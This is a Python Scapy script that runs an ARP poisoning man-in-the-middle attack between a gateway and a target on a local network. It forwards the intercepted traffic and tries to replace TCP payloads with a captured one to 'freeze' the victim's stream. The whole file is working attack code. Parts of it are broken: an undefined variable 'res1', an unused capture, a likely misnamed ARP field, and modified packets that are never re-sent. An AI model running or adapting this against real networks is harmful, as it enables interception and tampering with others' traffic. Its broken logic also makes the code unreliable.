from scapy.all import *
import os
import signal
import sys
import threading
import time

gw_ip = "192.168.0.2"
target_ip = "192.168.0.3"
broadcast = "ff:ff:ff:ff:ff:ff"

conf.iface = "lo"

def swap_img(pkt):
    if pkt.haslayer(TCP):
        if pkt[TCP].flags & PSH and pkt[TCP].flags & ACK:
            pkt[Raw] = res1[0][Raw]
            del pkt[TCP].chksum

def get_mac_l2(ip_addr):
    res, unres = srp(Ether(dst=broadcast)/ARP(op=1, pdst=ip_addr), retry=2, timeout=10)
    for s, r in res:
        return r[ARP].hwsrc
    return None

def get_mac_l3(ip_addr):
    res, unres = sr(ARP(op=1, hwdst=broadcast, pdst=ip_addr), retry=2, timeout=10)
    for s, r in res:
        return r[ARP].hwsrc
    return None

def restore_network(gw_ip, gw_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst=broadcast, pdst=gw_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst=broadcast, pdst=target_ip, hwsrc=gw_mac, psrc=gw_ip), count=5)
    print('[*] Disable IP forwarding')
    os.system('sysctl -w net.ipv4.ip_forward=0')
    os.kill(os.getpid(), signal.SIGTERM)

def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
    print('[*] Started ARP poison attack [CTRL-C to stop]')
    try:
        while True:
            send(ARP(op=2, pdst=gw_ip, hdst=gw_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=gw_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print('[*] Stopped ARP poison, restoring...')
        restore_network(gw_ip, gw_mac, target_ip, target_mac)

print('[*] Start script')
print('[*] Enabling IP forwarding')
os.system('sysctl -w net.ipv4.ip_forward=1')
print(f'[*] Gateway IP: {gw_ip}')
print(f'[*] Target IP: {target_ip}')

gw_mac = get_mac_l3(gw_ip)
if gw_mac is None:
    print('[!] Unable to get gateway MAC address. Exiting.')
    sys.exit(0)
else:
    print(f'[*] Gateway MAC: {gw_mac}')

target_mac = get_mac_l3(target_ip)
if target_mac is None:
    print('[!] Unable to get target MAC address. Exiting.')
    sys.exit(0)
else:
    print(f'[*] Target MAC: {target_mac}')

poison_thread = threading.Thread(target=arp_poison, args=(gw_ip, gw_mac, target_ip, target_mac))
poison_thread.start()

try:
    print('[*] Starting freeze')
    res = sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & PSH and x[TCP].flags & ACK, count=1)
    img = res[0][Raw]
    sniff(prn=swap_img)
except KeyboardInterrupt:
    print('[*] Stopped capture, restoring...')
    restore_network(gw_ip, gw_mac, target_ip, target_mac)


